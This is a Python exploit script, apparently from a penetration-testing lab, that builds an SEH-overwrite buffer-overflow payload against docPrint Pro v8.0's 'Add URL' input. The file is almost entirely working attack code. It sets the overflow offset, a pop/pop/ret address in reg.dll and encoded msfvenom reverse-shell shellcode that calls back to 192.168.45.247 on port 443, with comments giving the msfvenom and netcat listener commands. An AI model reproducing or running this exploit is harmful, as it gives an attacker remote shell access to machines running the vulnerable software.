#!/usr/bin/python3

from struct import pack
import pwn

def main() :
    # in Program "C:\Program Files\docPrint Pro v8.0\doc2pdf_win.exe":
    # File -> Add URL, then paste file contents

    # 0:000> !nmod
    # 00400000 00479000 doc2pdf_win          /SafeSEH OFF                C:\Program Files\docPrint Pro v8.0\doc2pdf_win.exe
    # 10000000 10022000 reg                  /SafeSEH OFF                C:\Program Files\docPrint Pro v8.0\reg.dll

    payloadSize = 0x2000
    badchars = b"\x00\x0a\x0d"

    # While ($true) { sleep 1 ; date ; Get-Content .\exploit.txt | Set-Clipboard }
    # buf += bytes([ b for b in range(0x100)
    #                  if b not in badchars])

    buf  = b""

    # buf += pwn.cyclic(payloadSize)
    offBufSeh = 0xf28                                           # pwn.cyclic_find(0x61766d62)

    jmp  = b"\xeb\x06\x90\x90"

    buf += b"A" * (offBufSeh - len(jmp) - len(buf))

    buf += jmp

    buf += pack("<I", 0x10011874)                               # SEH: pop/pop/ret

    buf += b"\x90" * 0x20

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.247 LPORT=443 -f python -e x86/xor_dynamic -b "\x00\x0a\x0d"
    # nc -vlnp 443
    buf += b"\xeb\x23\x5b\x89\xdf\xb0\x40\xfc\xae\x75\xfd\x89"
    buf += b"\xf9\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\xb0"
    buf += b"\xed\x74\x08\x46\x80\x3e\x40\x75\xee\xeb\xea\xff"
    buf += b"\xe1\xe8\xd8\xff\xff\xff\x2f\x40\xd3\xc7\xad\x2f"
    buf += b"\x2f\x2f\x4f\xa6\xca\x1e\xef\x4b\xa4\x7f\x1f\xa4"
    buf += b"\x7d\x23\xa4\x7d\x3b\xa4\x5d\x07\x20\x98\x65\x09"
    buf += b"\x1e\xd0\x83\x13\x4e\x53\x2d\x03\x0f\xee\xe0\x22"
    buf += b"\x2e\xe8\xcd\xdd\x7d\x78\xa4\x7d\x3f\xa4\x65\x13"
    buf += b"\xa4\x63\x3e\x57\xcc\x67\x2e\xfe\x7e\xa4\x76\x0f"
    buf += b"\x2e\xfc\xa4\x66\x37\xcc\x15\x66\xa4\x1b\xa4\x2e"
    buf += b"\xf9\x1e\xd0\x83\xee\xe0\x22\x2e\xe8\x17\xcf\x5a"
    buf += b"\xd9\x2c\x52\xd7\x14\x52\x0b\x5a\xcb\x77\xa4\x77"
    buf += b"\x0b\x2e\xfc\x49\xa4\x23\x64\xa4\x77\x33\x2e\xfc"
    buf += b"\xa4\x2b\xa4\x2e\xff\xa6\x6b\x0b\x0b\x74\x74\x4e"
    buf += b"\x76\x75\x7e\xd0\xcf\x70\x70\x75\xa4\x3d\xc4\xa2"
    buf += b"\x72\x47\x1c\x1d\x2f\x2f\x47\x58\x5c\x1d\x70\x7b"
    buf += b"\x47\x63\x58\x09\x28\xd0\xfa\x97\xbf\x2e\x2f\x2f"
    buf += b"\x06\xeb\x7b\x7f\x47\x06\xaf\x44\x2f\xd0\xfa\x7f"
    buf += b"\x7f\x7f\x7f\x6f\x7f\x6f\x7f\x47\xc5\x20\xf0\xcf"
    buf += b"\xd0\xfa\xb8\x45\x2a\x47\xef\x87\x02\xd8\x47\x2d"
    buf += b"\x2f\x2e\x94\xa6\xc9\x45\x3f\x79\x78\x47\xb6\x8a"
    buf += b"\x5b\x4e\xd0\xfa\xaa\xef\x5b\x23\xd0\x61\x27\x5a"
    buf += b"\xc3\x47\xdf\x9a\x8d\x79\xd0\xfa\x47\x4c\x42\x4b"
    buf += b"\x2f\xa6\xcc\x78\x78\x78\x1e\xd9\x45\x3d\x76\x79"
    buf += b"\xcd\xd2\x49\xe8\x6b\x0b\x13\x2e\x2e\xa2\x6b\x0b"
    buf += b"\x3f\xe9\x2f\x6b\x7b\x7f\x79\x79\x79\x69\x79\x61"
    buf += b"\x79\x79\x7c\x79\x47\x56\xe3\x10\xa9\xd0\xfa\xa6"
    buf += b"\xcf\x61\x79\x69\xd0\x1f\x47\x27\xa8\x32\x4f\xd0"
    buf += b"\xfa\x94\xdf\x9a\x8d\x79\x47\x89\xba\x92\xb2\xd0"
    buf += b"\xfa\x13\x29\x53\x25\xaf\xd4\xcf\x5a\x2a\x94\x68"
    buf += b"\x3c\x5d\x40\x45\x2f\x7c\xd0\xfa\xb0\xed"

    buf += b"Z" * (payloadSize - len(buf))

    assert len(buf) == payloadSize, "Mismatching size: f{len(buf)} != f{payloadSize}"
    for b in badchars:
        assert b not in buf, print(f"Error: badchar {hex(b)} ('{chr(b)}') appeared in payload", "\n\n", pwn.hexdump(buf))

    with open("exploit.txt", "wb") as f:
        f.write(buf)

if __name__ == "__main__":
    main()
